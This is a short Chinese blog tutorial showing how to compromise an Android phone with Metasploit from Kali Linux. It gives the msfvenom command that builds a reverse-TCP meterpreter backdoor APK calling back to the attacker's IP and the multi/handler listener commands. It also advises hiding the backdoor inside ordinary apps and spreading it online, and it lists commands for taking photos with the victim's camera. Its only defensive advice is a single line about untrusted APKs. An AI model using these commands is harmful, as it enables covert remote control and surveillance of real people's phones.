---
title: "演示使用Metasploit入侵Android"
categories: [ "安全" ]
tags: [ "系统安全" ]
draft: false
slug: "演示使用Metasploit入侵Android-演示使用metasploit入侵android"
date: "2017-04-08 08:45:50"
---



文本演示怎么使用Kali Linux入侵Android手机。

Kali Linux IP地址：192.168.0.112；接收连接的端口：443。

![][1] 

同一局域网内android手机一部(android 5.1)

## 创建一个后门程序

在终端中执行：

    # msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=443 > my_backdoor.apk

这个后门程序(APK)是发送给受害者的；要把上面命令的IP地址替换为攻击者IP，当后门程序运行时，它会试图连接这个IP。

## 启动Metasploit－等待受害者启动后门程序

    msfconsole

![][2] 

依次执行：

    msf > use exploit/multi/handler
        > set payload android/meterpreter/reverse_tcp
        > set lhost 192.168.0.112
        > set lport 443
        > exploit

![][3] 

## 分发后门程序

一般后门程序都打包到正常app中，反正就是各种藏；

借助internet分发后门程序。

闲话不多书，这里我在自己的android手机上安装运行带后门的apk。

![][4] 

病毒！！！

## 控制受害者手机

受害者运行后门程序之后，就可以使用Metasploit控制他了：

![][5] 

使用help查看可以使用的命令：

![][6] 

例如使用对方的摄像头拍照：

    > webcam_list
    > webcam_snap

怎么防范：

  * 不要安装不信任的apk

![][7]

 [1]: /uploads/oss/2017-04-25-14916411615769.png ""
 [2]: /uploads/oss/2017-04-25-14916412005880.png ""
 [3]: /uploads/oss/2017-04-25-14916412189083.png ""
 [4]: /uploads/oss/2017-04-25-14916412390423.jpg ""
 [5]: /uploads/oss/2017-04-25-14916412586255.png ""
 [6]: /uploads/oss/2017-04-25-14916412682896.png ""
 [7]: /uploads/oss/2017-04-25-14916413029124.png ""